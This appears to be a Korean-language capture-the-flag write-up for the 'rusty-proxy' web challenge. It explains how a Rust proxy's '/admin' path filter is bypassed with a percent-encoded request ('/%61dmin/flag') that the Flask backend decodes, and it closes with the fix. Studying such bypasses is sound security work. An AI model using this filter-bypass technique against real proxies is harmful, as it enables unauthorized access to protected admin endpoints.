---
title: "[Web] rusty-proxy"
description: Writeup for "rusty-proxy" from BITS CTF 2026.
date: 2026-02-22 01:00:00 +0900
categories: [CTF, BITS CTF 2026]
tags: [Web]
toc: true
comments: false
---

# rusty-proxy (BITS CTF 2026)

---

- **Name:** rusty-proxy
- **Category:** Web
- **Description:** I just vibecoded a highly secure reverse proxy using rust, I hope it works properly.
- **Connection:** `http://<TARGET>`
- **Flag format:** `BITSCTF{...}`

---

### 개요

Rust로 만든 리버스 프록시 앞에 Flask 백엔드가 숨어 있는 구조입니다.

```
[클라이언트]
    │
    ▼
[Rust 프록시 :80]
  /admin 경로 차단
    │
    ▼
[Flask 백엔드 :8080]
  /admin/flag → FLAG 반환
```

플래그는 Flask의 `/admin/flag`에 있지만,
프록시가 `/admin` 경로를 모두 막고 있습니다.

---

### 소스 분석

#### backend/server.py — 플래그 위치 확인

```python
FLAG = os.getenv("FLAG", "BITSCTF{fake_flag}")

@app.route('/admin/flag')
def vault():
    return jsonify({"flag": FLAG})
```

Flask는 `/admin/flag`로 요청이 오면 플래그를 반환합니다.
직접 접근할 수만 있다면 끝입니다.

#### proxy/src/main.rs — 경로 필터 확인

프록시가 어떻게 경로를 차단하는지 봅니다.

```rust
fn is_path_allowed(path: &str) -> bool {
    let normalized = path.to_lowercase();
    if normalized.starts_with("/admin") {
        return false;
    }
    true
}
```

경로를 소문자로 변환한 뒤 `/admin`으로 시작하면 차단합니다.

여기서 중요한 점이 하나 있습니다.
`path.to_lowercase()`만 할 뿐, **URL 디코딩을 하지 않습니다.**

---

### 취약점 분석

URL 인코딩에서 `a`는 `%61`입니다.

프록시에게 `/%61dmin/flag`는 어떻게 보일까요?

```rust
normalized = "/%61dmin/flag"
normalized.starts_with("/admin")  // → false
// → 차단하지 않고 통과
```

`%61`을 그대로 문자열로 비교하기 때문에 `/admin`과 다르다고 판단합니다.

Flask/Werkzeug는 HTTP 표준에 따라 `%61`을 `a`로 디코딩합니다.

```python
# /%61dmin/flag 요청 수신
# %61 → a 디코딩
# → /admin/flag 라우트 매칭
```

같은 URL을 프록시와 Flask가 **다르게 해석**합니다.
프록시는 필터를 통과시키고, Flask는 `/admin/flag`로 처리합니다.

| 요청 경로 | 프록시가 보는 값 | `/admin`으로 시작? | 결과 |
|---|---|---|---|
| `/admin/flag` | `/admin/flag` | YES | 차단 ❌ |
| `/%61dmin/flag` | `/%61dmin/flag` | NO | 통과 ✅ |

---

### Exploit 실행 과정

`admin`의 `a`를 `%61`로 인코딩해서 요청을 보냅니다.

```bash
curl "http://<TARGET>/%61dmin/flag"
```

실행 결과:

```json
{"flag": "BITSCTF{...}"}
```

---

### FLAG

```
BITSCTF{...}
```

---

### 요약

이 문제의 핵심은 **Parser Differential**입니다.

보안 필터(Rust 프록시)와 실제 핸들러(Flask)가
같은 URL을 다르게 파싱할 때, 필터는 언제나 우회할 수 있습니다.

프록시는 URL을 raw 문자열로 비교하고,
Flask는 percent-encoding을 디코딩해서 라우팅합니다.

수정 방법은 단순합니다.
보안 검사 전에 백엔드와 동일한 방식으로 URL을 디코딩하면 됩니다.
